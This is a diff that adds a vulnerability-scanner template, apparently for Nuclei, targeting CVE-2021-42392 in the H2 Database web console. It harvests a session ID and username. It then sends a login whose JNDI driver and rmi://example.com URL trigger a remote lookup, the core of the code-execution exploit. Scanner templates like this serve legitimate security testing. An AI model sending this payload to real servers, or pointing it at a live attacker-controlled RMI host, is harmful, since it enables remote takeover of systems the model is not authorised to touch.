@@ -1,0 +1,67 @@
+id: cve-2021-42392
+info:
+  name: H2 Database Console Code Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    H2 database is a Java memory database primarily used for unit testing. This template exploits an unauthorized remote code execution vulnerability in the H2 Database web management page. Attackers can execute arbitrary code, write backdoors, and potentially take control of the web server.
+  classification:
+    cve-id: CVE-2021-42392
+  tags: code-execution
+http:
+  - raw:
+      - |
+        GET /login.jsp HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "location.href"
+    extractors:
+      - type: regex
+        name: jsessionid
+        part: body
+        regex:
+          - "'login\\.jsp\\?jsessionid=(.*?)'"
+        internal: true
+  - raw:
+      - |
+        GET /login.jsp?jsessionid={{jsessionid}} HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "name=\"user\" value=\""
+    extractors:
+      - type: regex
+        name: user
+        part: body
+        regex:
+          - "name=\"user\" value=\"(.*?)\" style"
+        internal: true
+  - raw:
+      - |
+        POST /login.do?jsessionid={{jsessionid}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        language=en&setting=Generic+H2+%28Embedded%29&name=Generic+H2+%28Embedded%29&driver=javax.naming.InitialContext&url=rmi://example.com:1099/xyz&user={{user}}&password=
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "HY000"
